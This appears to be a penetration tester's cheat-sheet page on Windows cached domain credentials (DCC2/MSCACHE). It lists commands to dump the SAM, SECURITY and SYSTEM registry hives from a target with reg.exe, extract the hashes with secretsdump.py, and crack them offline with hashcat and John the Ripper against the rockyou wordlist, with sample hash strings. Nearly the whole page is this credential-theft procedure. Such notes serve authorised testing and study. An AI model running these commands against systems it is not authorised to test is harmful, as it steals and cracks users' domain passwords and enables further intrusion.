---
title: DCC2 (MSCACHE)
parent: Operating Systems
layout: default
nav_order: 2
---

1. On target, run:\
   `reg.exe save hklm\sam sam.save`\
   `reg.exe save hklm\security security.save`\
   `reg.exe save hklm\system system.save`
2. `secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
3. Save the DCC2 password in a text file manually. The output will be like this: `EXAM.COM/ted:$DCC2$10240#ted#2e77894e912565924cb886b99b320f5d`, but cannot use directly with hashcat. Can use directly with John though.
4. Save the output to a file hashes.txt and do this:\
   `echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt`\
   Now use this:\
   `hashcat -m2100 '$DCC2$10240#Administrator#f69ffa1c8261959618e5d4f1ad2b22cc' /usr/share/seclists/rockyou.txt --force --potfile-disable`\
   (can manually put in this format $DCC2$10240#username#hash if don't want to run above line) or if is a file just use\
   `hashcat -m2100 mcash.txt /usr/share/seclists/rockyou.txt --force --potfile-disable`
5. John:\
   `john --wordlist=/usr/share/seclists/rockyou.txt mscash2.txt --format=mscash2`